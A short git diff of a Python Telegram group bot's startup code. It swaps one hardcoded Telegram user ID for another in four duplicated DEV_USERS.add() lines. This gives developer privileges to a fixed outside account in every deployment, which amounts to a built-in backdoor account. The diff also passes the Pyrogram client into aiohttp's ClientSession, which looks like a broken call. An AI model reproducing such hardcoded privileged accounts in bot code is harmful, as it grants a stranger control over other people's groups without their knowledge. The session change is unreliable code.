@@ -145,10 +145,10 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1808943146)
-DEV_USERS.add(1808943146)
-DEV_USERS.add(1808943146)
-DEV_USERS.add(1808943146)
+DEV_USERS.add(5331427205)
+DEV_USERS.add(5331427205)
+DEV_USERS.add(5331427205)
+DEV_USERS.add(5331427205)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
@@ -156,7 +156,7 @@ telethn = TelegramClient("edith", API_ID, API_HASH)
 
 pbot = Client("edith", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
-aiohttpsession = ClientSession()
+aiohttpsession = ClientSession(pbot)
 
 print("[INFO]: Getting Bot Info...")
 BOT_ID = dispatcher.bot.id
